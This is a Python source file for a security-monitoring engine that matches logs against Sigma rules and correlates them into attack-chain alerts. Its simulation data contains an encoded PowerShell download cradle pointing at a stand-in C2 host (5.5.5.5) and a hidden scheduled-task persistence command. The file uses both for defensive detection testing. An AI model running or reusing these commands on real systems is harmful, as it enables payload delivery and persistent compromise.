import os
import sys
import time
import argparse
from datetime import datetime, timezone, timedelta
from elasticsearch import Elasticsearch
import psycopg2
import yaml

from soc_engine.config.settings import settings
from soc_engine.detection.sigma_matcher import SigmaMatcher
from soc_engine.detection.chain_matcher import load_chains, evaluate_basket
import soc_engine.detection.basket_manager as basket_manager
import soc_engine.models.db as db

class SOCEngine:
    def __init__(self, simulate=False):
        self.simulate = simulate
        self.sigma_matcher = SigmaMatcher()
        self.chains = load_chains()
        self.es_client = None
        self.grc_profile = {}
        
        self.load_grc_profile()
        
        if not self.simulate:
            self.init_connections()

    def load_grc_profile(self):
        """Loads GRC profile configured in settings."""
        profile_path = os.path.join(settings.GRC_PROFILE_DIR, f"{settings.ACTIVE_GRC_PROFILE}.yaml")
        try:
            with open(profile_path, "r") as f:
                self.grc_profile = yaml.safe_load(f)
            print(f"[*] GRC Profile Loaded: {self.grc_profile.get('client')} (Industry: {self.grc_profile.get('industry')})")
        except Exception as e:
            print(f"[!] Warning: Could not load GRC profile at {profile_path}: {e}")
            self.grc_profile = {
                "client": "Default",
                "enabled_rule_groups": ["endpoint", "network", "ad"],
                "auto_response_allowed": False
            }

    def init_connections(self):
        """Initializes ES, Postgres, and Redis connections."""
        print("[*] Initializing system connections...")
        try:
            self.es_client = Elasticsearch(settings.ES_HOST, request_timeout=2.0, max_retries=0)
            if not self.es_client.ping():
                print("[!] Elasticsearch connection failed. Running in SIMULATE mode instead.")
                self.simulate = True
            else:
                print("[+] Connected to Elasticsearch.")
        except Exception as e:
            print(f"[!] ES Connection error: {e}. Switching to SIMULATE mode.")
            self.simulate = True

        try:
            # Test PostgreSQL with a 2 second timeout
            conn = psycopg2.connect(
                host=settings.DB_HOST,
                port=settings.DB_PORT,
                database=settings.DB_NAME,
                user=settings.DB_USER,
                password=settings.DB_PASSWORD,
                connect_timeout=2
            )
            conn.close()
            print("[+] Connected to PostgreSQL.")
        except Exception as e:
            print(f"[!] PostgreSQL Connection error: {e}. Switching to SIMULATE mode.")
            self.simulate = True

        try:
            # Test Redis with a 2 second timeout
            basket_manager.redis_client.ping()
            print("[+] Connected to Redis.")
        except Exception as e:
            print(f"[!] Redis Connection error: {e}. Switching to SIMULATE mode.")
            self.simulate = True

    def run(self):
        print("="*60)
        print("      LOGXPRO AUTONOMOUS SOC CORRELATION ENGINE      ")
        print("="*60)
        if self.simulate:
            self.run_simulation()
        else:
            self.run_polling_loop()

    def run_polling_loop(self):
        """Polls Elasticsearch for new logs and processes them."""
        print("[*] Starting live Elasticsearch polling loop...")
        
        # Start looking from 1 minute ago
        last_polled_time = datetime.now(timezone.utc) - timedelta(minutes=1)
        
        while True:
            try:
                now = datetime.now(timezone.utc)
                # Format timestamps for ES query
                start_str = last_polled_time.isoformat()
                end_str = now.isoformat()

                # Query logs ingested between start_str and end_str
                query = {
                    "query": {
                        "range": {
                            "event.ingested": {
                                "gt": start_str,
                                "lte": end_str
                            }
                        }
                    },
                    "sort": [{"event.ingested": "asc"}],
                    "size": 1000
                }

                res = self.es_client.search(index=settings.ES_INDEX, body=query)
                hits = res["hits"]["hits"]
                
                if hits:
                    print(f"[*] Found {len(hits)} new logs. Processing...")
                    for hit in hits:
                        self.process_log(hit["_source"])
                
                last_polled_time = now
            except Exception as e:
                print(f"[!] Error in polling loop: {e}")
                
            time.sleep(settings.POLL_INTERVAL)

    def process_log(self, event: dict):
        """Processes a single log event through Sigma matching and Correlation."""
        # 1. Match against Sigma rules
        matches = self.sigma_matcher.match_event(event)
        for rule in matches:
            rule_id = rule["id"]
            host_name = event.get("host", {}).get("name", "UNKNOWN_HOST")
            user_name = event.get("user", {}).get("name")
            
            # Check GRC configuration
            rule_tags = rule.get("tags", [])
            # Skip disabled rule categories (simplified checks)
            if "pci" in rule_tags and "pci" in self.grc_profile.get("disabled_rule_groups", []):
                print(f"[-] GRC Suppressed: Rule {rule_id} is disabled for this client (PCI control).")
                continue

            # 2. Check suppression list in DB
            if db.is_alert_suppressed(host_name, user_name, rule_id):
                print(f"[-] Alert Suppressed: {rule_id} on {host_name} for user {user_name} is active in suppression table.")
                continue

            print(f"\n[!] MATCHED RULE: {rule['title']} (Level: {rule['level'].upper()})")
            print(f"    Host: {host_name} | User: {user_name or 'N/A'}")

            # 3. Create or find incident basket
            source_ip = event.get("source", {}).get("ip")
            basket, is_new = basket_manager.find_or_create_basket(host_name, user_name, source_ip)
            basket_id = str(basket["basket_id"])
            
            # Link MITRE technique ID to event entry
            mitre_id = rule["mitre_techniques"][0] if rule["mitre_techniques"] else None

            # 4. Save event to basket
            basket_manager.add_event(basket_id, rule_id, event, mitre_id)
            print(f"    [+] Event added to basket {basket_id[:8]}... (New Basket: {is_new})")

            # 5. Evaluate the basket for chains
            eval_res = evaluate_basket(basket_id, self.chains)
            confidence = eval_res["confidence"]
            
            if confidence > 0:
                print(f"    [>>>] Correlation Chain Match: '{eval_res['chain_name']}'")
                print(f"    [>>>] Current Basket Confidence: {confidence}% (Matched {len(eval_res['matched_stages'])} stages)")
                
                # Perform tiered alerts
                self.trigger_tiered_alert(basket, eval_res)

    def trigger_tiered_alert(self, basket: dict, eval_res: dict):
        """Displays formatted alerts depending on confidence tier."""
        confidence = eval_res["confidence"]
        basket_id = str(basket["basket_id"])
        host_name = basket["host_name"]
        chain_name = eval_res["chain_name"]
        
        print("-" * 50)
        if confidence < 50:
            print(f"\033[93m[TIER 1 - LOW ALERT] Alert Level escalation for host {host_name}\033[0m")
            print(f"Incident {basket_id[:8]}... is rising. Confidence at {confidence}%.")
        elif confidence < 100:
            print(f"\033[91m[TIER 2 - MEDIUM/HIGH ALERT] Actionable correlation on {host_name}\033[0m")
            print(f"Incident {basket_id[:8]}... matching stages: {[s['stage'] for s in eval_res['matched_stages']]}")
        else:
            print(f"\033[41m\033[97m[TIER 3 - CRITICAL INCIDENT] Confirmed Attack Chain '{chain_name}' on {host_name}!\033[0m")
            print(f"Basket ID: {basket_id}")
            print(f"All stages matched! Triggering SOAR response playbook recommendations...")
            # Phase 5 auto response block recommendation
            for stage in eval_res["matched_stages"]:
                if stage["mitre"] == "T1071": # C2 connection stage
                    c2_ip = stage["event"].get("rule_id") # C2 IP
                    print(f"Playbook Advice: [ACTION REQUIRED] Run: sudo iptables -A OUTPUT -d <C2_IP> -j DROP")
        print("-" * 50)

    def run_simulation(self):
        """Simulates an attack timeline to demonstrate rules and correlation without Docker stack."""
        print("[*] Running in Simulation Mode.")
        print("[*] This will simulate 4 logs corresponding to our Phishing to C2 chain:")
        print("    1. RDP Brute Force Logon Failure (T1078)")
        print("    2. PowerShell Encoded Command Execution (T1059.001)")
        print("    3. Scheduled Task Creation (T1053.005)")
        print("    4. Connection to C2 Server 5.5.5.5 (T1071)")
        print("="*60)

        # Mock DB logic if simulated
        class MockDB:
            def __init__(self):
                self.basket = {
                    "basket_id": "simulated-basket-uuid-12345",
                    "host_name": "DESKTOP-VICTIM",
                    "user_name": "Administrator",
                    "source_ip": "192.168.1.50",
                    "status": "open",
                    "confidence_score": 0,
                    "matched_stages": []
                }
                self.events = []
            
            def is_suppressed(self, host, user, rule):
                return False
            
            def add_event(self, evt):
                self.events.append(evt)

        mock_db = MockDB()

        # Mock event stream
        simulated_events = [
            {
                "description": "Step 1: Failed RDP Login (Brute Force attempt)",
                "log": {
                    "@timestamp": datetime.now(timezone.utc).isoformat(),
                    "host": {"name": "DESKTOP-VICTIM"},
                    "user": {"name": "Administrator"},
                    "event": {"code": 4625},
                    "source": {"ip": "192.168.1.50"}
                },
                "mitre": "T1078",
                "rule_id": "win_system_rdp_bruteforce"
            },
            {
                "description": "Step 2: Attacker gets access and runs encoded powershell command",
                "log": {
                    "@timestamp": (datetime.now(timezone.utc) + timedelta(seconds=2)).isoformat(),
                    "host": {"name": "DESKTOP-VICTIM"},
                    "user": {"name": "Administrator"},
                    "event": {"code": 1},
                    "process": {
                        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "command_line": "powershell.exe -enc SQBFAFMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANQAuADUALgA1AC4ANQAvAHAAYQB5AGwAbwBhAGQAcwAnACkA",
                        "entity_id": "{a3984d3b-9a2c-63e5-0100-000000002100}"
                    }
                },
                "mitre": "T1059.001",
                "rule_id": "proc_creation_win_powershell_encoded_cmd"
            },
            {
                "description": "Step 3: Setup persistence using a Scheduled Task",
                "log": {
                    "@timestamp": (datetime.now(timezone.utc) + timedelta(seconds=4)).isoformat(),
                    "host": {"name": "DESKTOP-VICTIM"},
                    "user": {"name": "Administrator"},
                    "event": {"code": 1},
                    "process": {
                        "executable": "C:\\Windows\\System32\\schtasks.exe",
                        "command_line": "schtasks /create /tn \"WindowsUpdateDiag\" /tr \"powershell.exe -WindowStyle Hidden\" /sc minute /mo 30",
                        "entity_id": "{a3984d3b-9a2c-63e5-0200-000000002100}"
                    }
                },
                "mitre": "T1053.005",
                "rule_id": "proc_creation_win_scheduled_task_creation"
            },
            {
                "description": "Step 4: Outbound communication back to Attacker's C2 Server",
                "log": {
                    "@timestamp": (datetime.now(timezone.utc) + timedelta(seconds=6)).isoformat(),
                    "host": {"name": "DESKTOP-VICTIM"},
                    "user": {"name": "Administrator"},
                    "event": {"code": 3},
                    "destination": {
                        "ip": "5.5.5.5",
                        "port": 443
                    },
                    "source": {
                        "ip": "192.168.1.100"
                    }
                },
                "mitre": "T1071",
                "rule_id": "net_connection_win_c2_potential"
            }
        ]

        # Process simulation
        for i, step in enumerate(simulated_events, start=1):
            print(f"\n>>> Running Simulation {step['description']}...")
            time.sleep(2.5)

            # 1. Match Sigma rules
            matches = self.sigma_matcher.match_event(step["log"])
            for rule in matches:
                rule_id = rule["id"]
                host_name = step["log"].get("host", {}).get("name")
                user_name = step["log"].get("user", {}).get("name")

                # Mock event record mapping
                evt_record = {
                    "event_id": f"simulated-evt-uuid-{i}",
                    "basket_id": mock_db.basket["basket_id"],
                    "event_type": rule_id,
                    "raw_event": step["log"],
                    "mitre_technique": step["mitre"],
                    "ingestion_time": datetime.now(timezone.utc)
                }
                
                # Check suppression
                if mock_db.is_suppressed(host_name, user_name, rule_id):
                    print("    [-] Rule suppressed by GRC.")
                    continue

                print(f"    [!] MATCHED RULE: {rule['title']} (Level: {rule['level'].upper()})")
                
                # Add event
                mock_db.add_event(evt_record)
                print(f"    [+] Event added to basket {mock_db.basket['basket_id'][:8]}...")

                # Evaluate basket
                matched_stages_in_chain = []
                chain_stages = self.chains[0]["stages"]
                
                # Verify mock event hits against chain stages
                for stage in chain_stages:
                    stage_num = stage.get("stage")
                    mitre_id = stage.get("mitre")
                    rules_list = stage.get("sigma_rules", [])

                    stage_matched = False
                    matching_event = None
                    for ev in mock_db.events:
                        if ev["mitre_technique"] == mitre_id or ev["event_type"] in rules_list:
                            stage_matched = True
                            matching_event = {
                                "event_id": ev["event_id"],
                                "mitre_technique": ev["mitre_technique"],
                                "rule_id": ev["event_type"],
                                "ingestion_time": ev["ingestion_time"].isoformat()
                            }
                            break
                    
                    if stage_matched:
                        matched_stages_in_chain.append({
                            "stage": stage_num,
                            "mitre": mitre_id,
                            "matched": True,
                            "event": matching_event
                        })

                # Compute confidence
                confidence = int((len(matched_stages_in_chain) / len(chain_stages)) * 100)
                mock_db.basket["confidence_score"] = confidence
                mock_db.basket["matched_stages"] = matched_stages_in_chain

                print(f"    [>>>] Correlation Chain Match: '{self.chains[0]['name']}'")
                print(f"    [>>>] Current Basket Confidence: {confidence}% (Matched {len(matched_stages_in_chain)} of {len(chain_stages)} stages)")

                # Trigger alerts
                self.trigger_tiered_alert(mock_db.basket, {
                    "confidence": confidence,
                    "matched_stages": matched_stages_in_chain,
                    "chain_name": self.chains[0]['name']
                })
        
        print("\n[+] Simulation completed successfully.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LogXPro Correlation Engine")
    parser.add_argument("--simulate", "-s", action="store_true", help="Run the engine in simulation mode (offline)")
    args = parser.parse_args()
    
    # Run the engine. If simulate is True, run simulation. If False, try to connect first.
    engine = SOCEngine(simulate=args.simulate)
    engine.run()
